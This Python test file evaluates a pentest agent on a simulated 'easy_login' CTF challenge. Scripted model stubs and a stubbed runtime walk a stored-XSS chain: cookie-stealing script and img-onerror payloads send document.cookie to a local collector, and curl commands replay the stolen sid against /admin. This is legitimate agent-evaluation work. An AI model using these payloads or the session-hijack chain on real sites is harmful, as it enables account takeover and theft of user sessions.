"""Full-chain easy_login integration eval.

This test intentionally stays narrow:

- Reuses the existing CTF-mode agent loop and easy_login acceptance contract.
- Uses existing `browser`, `terminal`, `notes`, and `finish` tools.
- Stubs the runtime only as far as necessary to make the full `/login -> /visit
  -> sid -> /admin -> flag` exploit chain deterministic and regressible.

Minimal gap observed while wiring this test:
there is no first-class HTTP request tool in the main agent loop that can
reliably carry cookies between `/visit` and `/admin`, so this eval drives the
HTTP side of the chain through the existing `terminal` tool. That still proves
the agent can orchestrate the full exploit chain end-to-end instead of stopping
at direction judgement.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from types import SimpleNamespace

import pytest

import pentestagent.tools.notes as notes_module
from pentestagent.agents.pa_agent.pa_agent import PentestAgentAgent
from pentestagent.tools.notes import get_all_notes_sync, set_notes_file
from pentestagent.tools.registry import get_tool
from pentestagent.workspaces.manager import WorkspaceManager
from tests.integration.easy_login_acceptance import (
    EasyLoginEvidence,
    EasyLoginLevel,
    evaluate_easy_login_run,
)


STOLEN_SID = "flaghunter-admin-sid-9f3a"
FLAG_VALUE = "flag{easy_login_full_chain_ok}"
COLLECTOR_PORT = 8765
COLLECTOR_URL = f"http://127.0.0.1:{COLLECTOR_PORT}"
PAYLOAD = (
    f"<script>new Image().src='{COLLECTOR_URL}/?sid='+document.cookie</script>"
)
FALLBACK_SECOND_PAYLOAD = (
    f"<img src=x onerror='new Image().src=`{COLLECTOR_URL}/?sid=${{document.cookie}}`'>"
)
SID_NOTE_KEY = "easy_login_sid"
FLAG_NOTE_KEY = "easy_login_flag"


class _CommandResult:
    def __init__(self, exit_code: int, stdout: str = "", stderr: str = ""):
        self.exit_code = exit_code
        self.stdout = stdout
        self.stderr = stderr

    @property
    def success(self) -> bool:
        return self.exit_code == 0


class _EasyLoginFullChainRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.plan = None
        self.target = "http://localhost:3000/"
        self.browser_calls: list[tuple[str, dict]] = []
        self.proxy_calls: list[tuple[str, dict]] = []
        self.command_log: list[str] = []
        self.chain_events: list[str] = []

        self.collector_started = False
        self.payload_submitted = False
        self.visit_triggered = False
        self.extracted_sid: str | None = None
        self.admin_sid_used: str | None = None
        self.observed_flag: str | None = None
        self.post_flag_tool_calls = 0
        self.collector_log = ""
        self.login_payload = ""

    async def browser_action(self, action: str, **kwargs):
        self.browser_calls.append((action, dict(kwargs)))

        if action == "navigate":
            requested_url = kwargs.get("url", "")
            return {
                "url": "http://127.0.0.1:3000/",
                "requested_url": requested_url,
                "title": "easy_login Dashboard",
            }

        if action == "get_content":
            return {
                "content": "easy_login Login Portal Playground /login /visit /admin",
                "html": """
                <html>
                  <head>
                    <title>easy_login Dashboard</title>
                    <script src="/app.js"></script>
                  </head>
                  <body>
                    <h1>easy_login</h1>
                    <form id="loginForm" action="/login" method="post">
                      <input id="username" name="username" />
                      <input id="password" name="password" />
                      <textarea id="bio" name="bio"></textarea>
                      <button type="submit">Login</button>
                    </form>
                    <a href="/visit">visit</a>
                    <a href="/admin">admin</a>
                  </body>
                </html>
                """,
            }

        if action == "get_forms":
            return {
                "forms": [
                    {
                        "action": "http://127.0.0.1:3000/login",
                        "method": "post",
                        "inputs": [
                            {"name": "username", "type": "text"},
                            {"name": "password", "type": "password"},
                            {"name": "bio", "type": "textarea"},
                        ],
                    }
                ]
            }

        return {"error": f"unexpected browser action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        self.proxy_calls.append((action, dict(kwargs)))
        if action == "get" and kwargs.get("url") == "http://127.0.0.1:3000/app.js":
            return {
                "status_code": 200,
                "body": """
                const loginPath = '/login';
                const visitPath = '/visit';
                const adminPath = '/admin';
                async function triggerVisit() { return fetch('/visit', {method:'POST'}); }
                async function loadAdmin() { return fetch('/admin'); }
                """,
            }
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 300):
        self.command_log.append(command)
        if self.observed_flag:
            self.post_flag_tool_calls += 1

        if command == "curl -s http://127.0.0.1:3000/app.js":
            return _CommandResult(
                0,
                stdout=(
                    "const loginPath='/login'; const visitPath='/visit'; "
                    "const adminPath='/admin'; fetch('/visit',{method:'POST'}); "
                    "fetch('/admin');"
                ),
            )

        if command == f"python -u collector.py --port {COLLECTOR_PORT}":
            self.collector_started = True
            return _CommandResult(
                0,
                stdout=f"collector listening on 127.0.0.1:{COLLECTOR_PORT}",
            )

        if command.startswith("curl -s -X POST http://127.0.0.1:3000/login "):
            assert self.collector_started is True
            assert COLLECTOR_URL in command
            assert "<script>" in command
            self.payload_submitted = True
            self.login_payload = command
            self.chain_events.append("/login")
            return _CommandResult(
                0,
                stdout=(
                    "registered ordinary user demo_user via /login and stored profile "
                    "payload for admin bot review"
                ),
            )

        if command == "curl -s -X POST http://127.0.0.1:3000/visit":
            assert self.payload_submitted is True
            self.visit_triggered = True
            self.collector_log = (
                f"[collector] GET /?sid={STOLEN_SID} HTTP/1.1 from 127.0.0.1"
            )
            self.chain_events.append("/visit")
            return _CommandResult(
                0,
                stdout="visit triggered; admin bot opened stored profile",
            )

        if command == "Get-Content collector.log":
            assert self.visit_triggered is True
            assert self.collector_log
            self.extracted_sid = STOLEN_SID
            self.chain_events.append("sid")
            return _CommandResult(0, stdout=self.collector_log)

        if command.startswith("curl -s http://127.0.0.1:3000/admin "):
            assert f'Cookie: sid={STOLEN_SID}' in command
            self.admin_sid_used = STOLEN_SID
            self.observed_flag = FLAG_VALUE
            self.chain_events.append("/admin")
            return _CommandResult(
                0,
                stdout=f"welcome admin\n{FLAG_VALUE}\n",
            )

        return _CommandResult(1, stderr=f"unexpected command: {command}")


class _EasyLoginPayloadFallbackRuntime(_EasyLoginFullChainRuntime):
    def __init__(self):
        super().__init__()
        self.payload_attempts: list[str] = []
        self.payload_submission_count = 0
        self.visit_attempt_count = 0
        self.collector_reads: list[str] = []
        self.first_payload_failed = False
        self.second_payload_worked = False

    async def execute_command(self, command: str, timeout: int = 300):
        self.command_log.append(command)
        if self.observed_flag:
            self.post_flag_tool_calls += 1

        if command == "curl -s http://127.0.0.1:3000/app.js":
            return _CommandResult(
                0,
                stdout=(
                    "const loginPath='/login'; const visitPath='/visit'; "
                    "const adminPath='/admin'; fetch('/visit',{method:'POST'}); "
                    "fetch('/admin');"
                ),
            )

        if command == f"python -u collector.py --port {COLLECTOR_PORT}":
            self.collector_started = True
            return _CommandResult(
                0,
                stdout=f"collector listening on 127.0.0.1:{COLLECTOR_PORT}",
            )

        if command.startswith("curl -s -X POST http://127.0.0.1:3000/login "):
            assert self.collector_started is True
            assert COLLECTOR_URL in command

            if PAYLOAD in command:
                variant = "first"
            elif FALLBACK_SECOND_PAYLOAD in command:
                variant = "second"
            else:
                return _CommandResult(1, stderr=f"unexpected payload variant: {command}")

            self.payload_submitted = True
            self.payload_submission_count += 1
            self.payload_attempts.append(variant)
            self.login_payload = command
            self.chain_events.append(f"/login:{variant}")
            return _CommandResult(
                0,
                stdout=(
                    f"registered ordinary user demo_user via /login and stored {variant} "
                    "payload for admin bot review"
                ),
            )

        if command == "curl -s -X POST http://127.0.0.1:3000/visit":
            assert self.payload_submitted is True
            assert self.payload_attempts
            self.visit_attempt_count += 1
            current_variant = self.payload_attempts[-1]

            if current_variant == "first":
                self.first_payload_failed = True
                self.collector_log = "[collector] no requests captured yet"
                self.chain_events.append("/visit:first_failed")
                return _CommandResult(
                    0,
                    stdout=(
                        "visit triggered; admin bot rendered stored profile but no sid "
                        "exfil was observed for payload_v1"
                    ),
                )

            self.visit_triggered = True
            self.second_payload_worked = True
            self.collector_log = (
                f"[collector] GET /?sid={STOLEN_SID} HTTP/1.1 from 127.0.0.1"
            )
            self.chain_events.append("/visit")
            return _CommandResult(
                0,
                stdout=(
                    "visit triggered; admin bot executed fallback payload_v2 and "
                    "collector received sid"
                ),
            )

        if command == "Get-Content collector.log":
            assert self.collector_log
            self.collector_reads.append(self.collector_log)
            if "sid=" in self.collector_log:
                self.extracted_sid = STOLEN_SID
                self.chain_events.append("sid")
            return _CommandResult(0, stdout=self.collector_log)

        if command.startswith("curl -s http://127.0.0.1:3000/admin "):
            assert f'Cookie: sid={STOLEN_SID}' in command
            self.admin_sid_used = STOLEN_SID
            self.observed_flag = FLAG_VALUE
            self.chain_events.append("/admin")
            return _CommandResult(
                0,
                stdout=f"welcome admin\n{FLAG_VALUE}\n",
            )

        return _CommandResult(1, stderr=f"unexpected command: {command}")


def _tool_call(call_id: str, name: str, arguments: dict):
    return SimpleNamespace(
        id=call_id,
        function=SimpleNamespace(
            name=name,
            arguments=json.dumps(arguments, ensure_ascii=False),
        ),
    )


def _tool_messages(messages: list[dict]) -> list[str]:
    return [
        str(m.get("content") or "")
        for m in messages
        if isinstance(m, dict) and m.get("role") == "tool"
    ]


def _extract_sid_from_messages(messages: list[dict]) -> str | None:
    combined = "\n".join(_tool_messages(messages))
    match = re.search(r"sid=([A-Za-z0-9-]+)", combined)
    return match.group(1) if match else None


class _EasyLoginFullSolveLLM:
    """Deterministic LLM stub that must walk the whole exploit chain."""

    def __init__(self):
        self.normal_calls = 0
        self.summary_calls = 0
        self.runtime_blocks: list[str] = []

    async def generate(self, system_prompt, messages, tools, task_hint="default", **kwargs):
        if "Provide a brief, clear summary of what was accomplished" in system_prompt:
            self.summary_calls += 1
            combined = "\n".join(_tool_messages(messages))
            flag_match = re.search(r"flag\{[^{}\r\n]+\}", combined, re.IGNORECASE)
            flag = flag_match.group(0) if flag_match else FLAG_VALUE
            return SimpleNamespace(
                content=(
                    "agent 完成 easy_login full-chain：观察首页/表单/app.js，"
                    "经 /login 提交 XSS payload，启动本地 collector，触发 /visit，"
                    f"从 collector 提取 sid={STOLEN_SID}，再携带 sid 访问 /admin，"
                    f"最终拿到 {flag}。"
                ),
                tool_calls=None,
                usage={"total_tokens": 9},
                finish_reason="stop",
            )

        runtime_block = system_prompt.split("## Runtime Ground Truth", 1)[1]
        self.runtime_blocks.append(runtime_block)

        if self.normal_calls == 0:
            assert "/login" in runtime_block
            assert "/admin" in runtime_block
            assert "/upload" not in runtime_block
            assert "treat those claims as hypotheses" in runtime_block
            assert "Do not assume cross-origin DOM access" in runtime_block

            self.normal_calls += 1
            return SimpleNamespace(
                content="先复核首页、表单和前端 JS，确认真实链路。",
                tool_calls=[
                    _tool_call(
                        "browser-content",
                        "browser",
                        {"action": "get_content", "url": "http://localhost:3000/"},
                    ),
                    _tool_call(
                        "browser-forms",
                        "browser",
                        {"action": "get_forms", "url": "http://localhost:3000/"},
                    ),
                    _tool_call(
                        "js-read",
                        "terminal",
                        {"command": "curl -s http://127.0.0.1:3000/app.js"},
                    ),
                ],
                usage={"total_tokens": 12},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 1:
            combined = "\n".join(_tool_messages(messages))
            assert "Page content:" in combined
            assert "Form 1:" in combined
            assert "/visit" in combined
            assert "/admin" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="启动本地 collector，准备接收 bot 带出的 sid。",
                tool_calls=[
                    _tool_call(
                        "collector-start",
                        "terminal",
                        {"command": f"python -u collector.py --port {COLLECTOR_PORT}"},
                    )
                ],
                usage={"total_tokens": 8},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 2:
            combined = "\n".join(_tool_messages(messages))
            assert f"collector listening on 127.0.0.1:{COLLECTOR_PORT}" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="构造 payload 并通过 /login 注册普通用户，让 bot 后续访问时触发 XSS。",
                tool_calls=[
                    _tool_call(
                        "login-payload",
                        "terminal",
                        {
                            "command": (
                                "curl -s -X POST http://127.0.0.1:3000/login "
                                f'--data "username=demo_user&password=demo_pass&bio={PAYLOAD}"'
                            )
                        },
                    )
                ],
                usage={"total_tokens": 10},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 3:
            combined = "\n".join(_tool_messages(messages))
            assert "registered ordinary user" in combined
            assert "payload" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="触发 /visit 并读取 collector 输出，提取 bot 带出的 sid。",
                tool_calls=[
                    _tool_call(
                        "trigger-visit",
                        "terminal",
                        {"command": "curl -s -X POST http://127.0.0.1:3000/visit"},
                    ),
                    _tool_call(
                        "read-collector",
                        "terminal",
                        {"command": "Get-Content collector.log"},
                    ),
                ],
                usage={"total_tokens": 10},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 4:
            sid = _extract_sid_from_messages(messages)
            assert sid == STOLEN_SID

            self.normal_calls += 1
            return SimpleNamespace(
                content="落盘 sid 凭证，并立即带 sid 访问 /admin 读取 flag。",
                tool_calls=[
                    _tool_call(
                        "note-sid",
                        "notes",
                        {
                            "action": "create",
                            "key": SID_NOTE_KEY,
                            "value": f"Captured sid={sid} from local collector output.",
                            "category": "credential",
                            "confidence": "high",
                            "target": "127.0.0.1:3000",
                            "username": "sid",
                            "password": sid,
                            "source": f"collector:{COLLECTOR_PORT}",
                        },
                    ),
                    _tool_call(
                        "admin-with-sid",
                        "terminal",
                        {
                            "command": (
                                "curl -s http://127.0.0.1:3000/admin "
                                f'-H "Cookie: sid={sid}"'
                            )
                        },
                    ),
                    _tool_call(
                        "finish-1",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 1,
                            "result": "Observed homepage, form, and app.js; confirmed /login /visit /admin are the real routes.",
                        },
                    ),
                    _tool_call(
                        "finish-2",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 2,
                            "result": "Submitted a stored XSS payload through /login while auto-registering a normal user.",
                        },
                    ),
                    _tool_call(
                        "finish-3",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 3,
                            "result": "Started a local collector and used /visit to make the admin bot execute the payload.",
                        },
                    ),
                    _tool_call(
                        "finish-4",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 4,
                            "result": f"Extracted sid={sid} from collector output and preserved it as a credential note.",
                        },
                    ),
                    _tool_call(
                        "finish-5",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 5,
                            "result": "Used the stolen sid to request /admin and inspect the response for the flag.",
                        },
                    ),
                ],
                usage={"total_tokens": 16},
                finish_reason="tool_calls",
            )

        raise AssertionError("unexpected extra non-summary LLM call")


class _EasyLoginPayloadFallbackLLM:
    """Deterministic LLM stub that must recover from a failed first payload."""

    def __init__(self):
        self.normal_calls = 0
        self.summary_calls = 0
        self.runtime_blocks: list[str] = []

    async def generate(self, system_prompt, messages, tools, task_hint="default", **kwargs):
        if "Provide a brief, clear summary of what was accomplished" in system_prompt:
            self.summary_calls += 1
            combined = "\n".join(_tool_messages(messages))
            flag_match = re.search(r"flag\{[^{}\r\n]+\}", combined, re.IGNORECASE)
            flag = flag_match.group(0) if flag_match else FLAG_VALUE
            return SimpleNamespace(
                content=(
                    "agent 完成 easy_login payload fallback full-chain：第一次 `<script>` "
                    "payload 未成功带出 sid，agent 识别 first failed 后没有停住，而是 "
                    "fallback / retry 到第二个最小事件型 payload；第二种 payload worked，"
                    f"随后经 /visit -> sid -> /admin 拿到 {flag}。"
                ),
                tool_calls=None,
                usage={"total_tokens": 11},
                finish_reason="stop",
            )

        runtime_block = system_prompt.split("## Runtime Ground Truth", 1)[1]
        self.runtime_blocks.append(runtime_block)

        if self.normal_calls == 0:
            assert "/login" in runtime_block
            assert "/admin" in runtime_block
            assert "retry once with a second minimal same-origin variant" in runtime_block
            assert "Do not assume cross-origin DOM access" in runtime_block

            self.normal_calls += 1
            return SimpleNamespace(
                content="先复核首页、表单和前端 JS，确认 easy_login 仍是 /login -> /visit -> /admin 主链。",
                tool_calls=[
                    _tool_call(
                        "browser-content",
                        "browser",
                        {"action": "get_content", "url": "http://localhost:3000/"},
                    ),
                    _tool_call(
                        "browser-forms",
                        "browser",
                        {"action": "get_forms", "url": "http://localhost:3000/"},
                    ),
                    _tool_call(
                        "js-read",
                        "terminal",
                        {"command": "curl -s http://127.0.0.1:3000/app.js"},
                    ),
                ],
                usage={"total_tokens": 12},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 1:
            combined = "\n".join(_tool_messages(messages))
            assert "Page content:" in combined
            assert "Form 1:" in combined
            assert "/visit" in combined
            assert "/admin" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="启动本地 collector，准备验证 payload 是否真的能带出 sid。",
                tool_calls=[
                    _tool_call(
                        "collector-start",
                        "terminal",
                        {"command": f"python -u collector.py --port {COLLECTOR_PORT}"},
                    )
                ],
                usage={"total_tokens": 8},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 2:
            combined = "\n".join(_tool_messages(messages))
            assert f"collector listening on 127.0.0.1:{COLLECTOR_PORT}" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="先提交第一种最小 `<script>` payload，验证 bot 是否会回放并带出 sid。",
                tool_calls=[
                    _tool_call(
                        "login-payload-1",
                        "terminal",
                        {
                            "command": (
                                "curl -s -X POST http://127.0.0.1:3000/login "
                                f'--data "username=demo_user&password=demo_pass&bio={PAYLOAD}"'
                            )
                        },
                    )
                ],
                usage={"total_tokens": 10},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 3:
            combined = "\n".join(_tool_messages(messages))
            assert "stored first payload" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="触发第一次 /visit 并读取 collector；如果没有 sid，就按最小 fallback 继续。",
                tool_calls=[
                    _tool_call(
                        "trigger-visit-1",
                        "terminal",
                        {"command": "curl -s -X POST http://127.0.0.1:3000/visit"},
                    ),
                    _tool_call(
                        "read-collector-1",
                        "terminal",
                        {"command": "Get-Content collector.log"},
                    ),
                ],
                usage={"total_tokens": 11},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 4:
            combined = "\n".join(_tool_messages(messages))
            sid = _extract_sid_from_messages(messages)
            assert sid is None
            assert "no requests captured yet" in combined
            assert "payload_v1" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="第一次 payload 没成功带出 sid，记录 first failed，并改投第二种最小事件型 payload。",
                tool_calls=[
                    _tool_call(
                        "login-payload-2",
                        "terminal",
                        {
                            "command": (
                                "curl -s -X POST http://127.0.0.1:3000/login "
                                f'--data "username=demo_user&password=demo_pass&bio={FALLBACK_SECOND_PAYLOAD}"'
                            )
                        },
                    )
                ],
                usage={"total_tokens": 12},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 5:
            combined = "\n".join(_tool_messages(messages))
            assert "stored second payload" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="再次触发 /visit 并读取 collector，验证第二种 payload 是否成功带出 sid。",
                tool_calls=[
                    _tool_call(
                        "trigger-visit-2",
                        "terminal",
                        {"command": "curl -s -X POST http://127.0.0.1:3000/visit"},
                    ),
                    _tool_call(
                        "read-collector-2",
                        "terminal",
                        {"command": "Get-Content collector.log"},
                    ),
                ],
                usage={"total_tokens": 11},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 6:
            sid = _extract_sid_from_messages(messages)
            assert sid == STOLEN_SID

            self.normal_calls += 1
            return SimpleNamespace(
                content="第二种 payload 成功后，立即落盘 sid，并带 sid 请求 /admin 读取 flag。",
                tool_calls=[
                    _tool_call(
                        "note-sid",
                        "notes",
                        {
                            "action": "create",
                            "key": SID_NOTE_KEY,
                            "value": (
                                f"Captured sid={sid} after payload fallback: first failed, "
                                "second worked."
                            ),
                            "category": "credential",
                            "confidence": "high",
                            "target": "127.0.0.1:3000",
                            "username": "sid",
                            "password": sid,
                            "source": f"collector:{COLLECTOR_PORT}",
                        },
                    ),
                    _tool_call(
                        "admin-with-sid",
                        "terminal",
                        {
                            "command": (
                                "curl -s http://127.0.0.1:3000/admin "
                                f'-H "Cookie: sid={sid}"'
                            )
                        },
                    ),
                    _tool_call(
                        "finish-1",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 1,
                            "result": "Observed homepage, forms, and app.js; confirmed /login /visit /admin are the real routes.",
                        },
                    ),
                    _tool_call(
                        "finish-2",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 2,
                            "result": "First minimal script payload failed after /visit showed no sid; fallback/retry to a second minimal event-handler payload succeeded.",
                        },
                    ),
                    _tool_call(
                        "finish-3",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 3,
                            "result": "Triggered /visit twice and kept the chain same-origin instead of drifting into cross-origin browser tricks.",
                        },
                    ),
                    _tool_call(
                        "finish-4",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 4,
                            "result": f"Extracted sid={sid} from collector output after the second payload variant worked.",
                        },
                    ),
                    _tool_call(
                        "finish-5",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 5,
                            "result": "Used the recovered sid to request /admin and inspect the response for the flag.",
                        },
                    ),
                ],
                usage={"total_tokens": 18},
                finish_reason="tool_calls",
            )

        raise AssertionError("unexpected extra non-summary LLM call")


@pytest.fixture
def isolated_notes(tmp_path: Path):
    notes_file = tmp_path / "notes.json"
    set_notes_file(notes_file)
    notes_module._notes.clear()
    notes_module._loaded_notes_file = None
    yield notes_file
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_easy_login_full_chain_solve(monkeypatch, tmp_path, isolated_notes):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("CPA_M3_REPORTER", "false")

    async def _noop(*args, **kwargs):
        return None

    monkeypatch.setattr("pentestagent.tools.finish._persist_session_knowledge", _noop)
    monkeypatch.setattr("pentestagent.tools.finish._generate_auto_report", _noop)

    mgr = WorkspaceManager(root=tmp_path)
    mgr.create("easy_login_full_chain_eval")
    mgr.add_targets("easy_login_full_chain_eval", ["http://127.0.0.1:3000"])
    mgr.set_active("easy_login_full_chain_eval")

    import pentestagent.tools.browser  # noqa: F401
    import pentestagent.tools.finish  # noqa: F401
    import pentestagent.tools.notes  # noqa: F401
    import pentestagent.tools.terminal  # noqa: F401

    browser_tool = get_tool("browser")
    terminal_tool = get_tool("terminal")
    notes_tool = get_tool("notes")
    finish_tool = get_tool("finish")
    assert browser_tool is not None
    assert terminal_tool is not None
    assert notes_tool is not None
    assert finish_tool is not None

    runtime = _EasyLoginFullChainRuntime()
    llm = _EasyLoginFullSolveLLM()
    agent = PentestAgentAgent(
        llm=llm,
        tools=[browser_tool, terminal_tool, notes_tool, finish_tool],
        runtime=runtime,
        target="http://localhost:3000/",
        scope=["http://127.0.0.1:3000"],
    )

    task = """[CTF MODE] Target: http://localhost:3000/
Challenge type: xss
Hint: maybe /upload or iframe.contentDocument tricks, but this is likely a bot/XSS/cookie theft flow

OBJECTIVE: Find and capture the flag as fast as possible.
"""

    messages = []
    async for msg in agent.agent_loop(task):
        messages.append(msg)

    assert agent._task_plan.is_complete() is True
    assert llm.summary_calls == 1

    browser_actions = [action for action, _ in runtime.browser_calls]
    assert browser_actions[:3] == ["navigate", "get_content", "get_forms"]
    assert "get_content" in browser_actions
    assert "get_forms" in browser_actions
    assert runtime.proxy_calls == [
        ("get", {"url": "http://127.0.0.1:3000/app.js", "timeout": 10})
    ]

    assert runtime.collector_started is True
    assert runtime.payload_submitted is True
    assert runtime.visit_triggered is True
    assert runtime.extracted_sid == STOLEN_SID
    assert runtime.admin_sid_used == STOLEN_SID
    assert runtime.observed_flag == FLAG_VALUE
    assert runtime.chain_events == ["/login", "/visit", "sid", "/admin"]
    assert runtime.post_flag_tool_calls == 0

    assert any("collector.py" in cmd for cmd in runtime.command_log)
    assert any("/login" in cmd and PAYLOAD in cmd for cmd in runtime.command_log)
    assert any("/visit" in cmd for cmd in runtime.command_log)
    assert any("/admin" in cmd and STOLEN_SID in cmd for cmd in runtime.command_log)
    assert not any("/upload" in cmd for cmd in runtime.command_log)
    assert not any("/register" in cmd for cmd in runtime.command_log)

    notes = get_all_notes_sync()
    assert SID_NOTE_KEY in notes
    sid_note = notes[SID_NOTE_KEY]
    assert sid_note["category"] == "credential"
    assert sid_note["confidence"] == "high"
    assert sid_note["metadata"]["username"] == "sid"
    assert sid_note["metadata"]["password"] == STOLEN_SID
    assert sid_note["metadata"]["target"] == "127.0.0.1:3000"

    runtime_block = llm.runtime_blocks[0]
    assert "/login" in runtime_block
    assert "/admin" in runtime_block
    assert "/upload" not in runtime_block

    completion_msgs = [m for m in messages if m.metadata.get("task_complete")]
    assert completion_msgs, "agent loop should emit a completion summary"
    summary = completion_msgs[-1].content
    assert "easy_login" in summary
    assert "flag{" in summary
    assert FLAG_VALUE in summary
    assert "/login" in summary
    assert "/visit" in summary
    assert "sid" in summary
    assert "/admin" in summary

    assessment = evaluate_easy_login_run(
        EasyLoginEvidence(
            observed_routes=("/login", "/visit", "/admin"),
            payload_submitted=runtime.payload_submitted,
            visit_triggered=runtime.visit_triggered,
            extracted_sid=runtime.extracted_sid,
            sid_note=sid_note,
            admin_sid_used=runtime.admin_sid_used,
            observed_flag=runtime.observed_flag,
            flag_source="/admin",
            stopped_immediately=True,
            post_flag_tool_calls=runtime.post_flag_tool_calls,
            clean_baseline=True,
            manual_intervention=False,
            successful_clean_runs=1,
        )
    )
    assert assessment.direction_judgement_success is True
    assert assessment.exploit_chain_success is True
    assert assessment.minimum_independent_success is True
    assert assessment.stable_independent_success is False
    assert assessment.highest_level is EasyLoginLevel.EXPLOIT


@pytest.mark.asyncio
async def test_easy_login_payload_fallback_full_chain_solve(
    monkeypatch, tmp_path, isolated_notes
):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("CPA_M3_REPORTER", "false")

    async def _noop(*args, **kwargs):
        return None

    monkeypatch.setattr("pentestagent.tools.finish._persist_session_knowledge", _noop)
    monkeypatch.setattr("pentestagent.tools.finish._generate_auto_report", _noop)

    mgr = WorkspaceManager(root=tmp_path)
    mgr.create("easy_login_payload_fallback_eval")
    mgr.add_targets("easy_login_payload_fallback_eval", ["http://127.0.0.1:3000"])
    mgr.set_active("easy_login_payload_fallback_eval")

    import pentestagent.tools.browser  # noqa: F401
    import pentestagent.tools.finish  # noqa: F401
    import pentestagent.tools.notes  # noqa: F401
    import pentestagent.tools.terminal  # noqa: F401

    browser_tool = get_tool("browser")
    terminal_tool = get_tool("terminal")
    notes_tool = get_tool("notes")
    finish_tool = get_tool("finish")
    assert browser_tool is not None
    assert terminal_tool is not None
    assert notes_tool is not None
    assert finish_tool is not None

    runtime = _EasyLoginPayloadFallbackRuntime()
    llm = _EasyLoginPayloadFallbackLLM()
    agent = PentestAgentAgent(
        llm=llm,
        tools=[browser_tool, terminal_tool, notes_tool, finish_tool],
        runtime=runtime,
        target="http://localhost:3000/",
        scope=["http://127.0.0.1:3000"],
    )

    task = """[CTF MODE] Target: http://localhost:3000/
Challenge type: xss
Hint: maybe /upload or iframe.contentDocument tricks, but this is likely a bot/XSS/cookie theft flow

OBJECTIVE: Find and capture the flag as fast as possible.
"""

    messages = []
    async for msg in agent.agent_loop(task):
        messages.append(msg)

    assert agent._task_plan.is_complete() is True
    assert llm.summary_calls == 1

    browser_actions = [action for action, _ in runtime.browser_calls]
    assert browser_actions[:3] == ["navigate", "get_content", "get_forms"]
    assert runtime.proxy_calls == [
        ("get", {"url": "http://127.0.0.1:3000/app.js", "timeout": 10})
    ]

    assert runtime.collector_started is True
    assert runtime.payload_submitted is True
    assert runtime.payload_submission_count == 2
    assert runtime.visit_attempt_count == 2
    assert runtime.payload_attempts == ["first", "second"]
    assert runtime.first_payload_failed is True
    assert runtime.second_payload_worked is True
    assert runtime.visit_triggered is True
    assert runtime.extracted_sid == STOLEN_SID
    assert runtime.admin_sid_used == STOLEN_SID
    assert runtime.observed_flag == FLAG_VALUE
    assert runtime.collector_reads == [
        "[collector] no requests captured yet",
        f"[collector] GET /?sid={STOLEN_SID} HTTP/1.1 from 127.0.0.1",
    ]
    assert runtime.chain_events == [
        "/login:first",
        "/visit:first_failed",
        "/login:second",
        "/visit",
        "sid",
        "/admin",
    ]
    assert runtime.post_flag_tool_calls == 0

    assert any("collector.py" in cmd for cmd in runtime.command_log)
    assert any("/login" in cmd and PAYLOAD in cmd for cmd in runtime.command_log)
    assert any(
        "/login" in cmd and FALLBACK_SECOND_PAYLOAD in cmd
        for cmd in runtime.command_log
    )
    first_login_index = next(
        idx
        for idx, cmd in enumerate(runtime.command_log)
        if "/login" in cmd and PAYLOAD in cmd
    )
    second_login_index = next(
        idx
        for idx, cmd in enumerate(runtime.command_log)
        if "/login" in cmd and FALLBACK_SECOND_PAYLOAD in cmd
    )
    assert first_login_index < second_login_index
    assert runtime.command_log.count("curl -s -X POST http://127.0.0.1:3000/visit") == 2
    assert any("/admin" in cmd and STOLEN_SID in cmd for cmd in runtime.command_log)
    assert not any("/upload" in cmd for cmd in runtime.command_log)
    assert not any("contentDocument" in cmd for cmd in runtime.command_log)
    assert not any("window.open" in cmd for cmd in runtime.command_log)

    notes = get_all_notes_sync()
    assert SID_NOTE_KEY in notes
    sid_note = notes[SID_NOTE_KEY]
    assert sid_note["category"] == "credential"
    assert sid_note["confidence"] == "high"
    assert sid_note["metadata"]["username"] == "sid"
    assert sid_note["metadata"]["password"] == STOLEN_SID
    assert sid_note["metadata"]["target"] == "127.0.0.1:3000"
    assert "first failed" in sid_note["content"]
    assert "second worked" in sid_note["content"]

    runtime_block = llm.runtime_blocks[0]
    assert "/login" in runtime_block
    assert "/admin" in runtime_block
    assert "/upload" not in runtime_block
    assert "retry once with a second minimal same-origin variant" in runtime_block
    assert "Do not assume cross-origin DOM access" in runtime_block

    completion_msgs = [m for m in messages if m.metadata.get("task_complete")]
    assert completion_msgs, "agent loop should emit a completion summary"
    summary = completion_msgs[-1].content
    summary_lower = summary.lower()
    assert "easy_login" in summary
    assert "flag{" in summary
    assert FLAG_VALUE in summary
    assert "/visit" in summary
    assert "sid" in summary
    assert "/admin" in summary
    assert "fallback" in summary_lower
    assert "retry" in summary_lower
    assert "first failed" in summary_lower
